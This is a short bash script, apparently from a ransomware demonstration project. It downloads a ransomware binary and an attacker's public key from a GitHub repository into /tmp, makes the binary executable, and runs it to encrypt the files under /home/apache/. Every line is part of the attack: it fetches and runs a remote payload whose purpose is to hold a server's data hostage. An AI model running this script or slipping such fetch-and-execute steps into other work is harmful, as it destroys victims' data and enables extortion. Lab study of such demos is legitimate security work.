#!/usr/bin/env bash
wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/ransomware/dist/ransomware -O /tmp/ransomware
wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/attacker/public_key.pem -O /tmp/public_key.pem
chmod +x /tmp/ransomware
export DISPLAY=:1.0
/tmp/ransomware --pub /tmp/public_key.pem --path /home/apache/ --enc-sym-key /tmp/
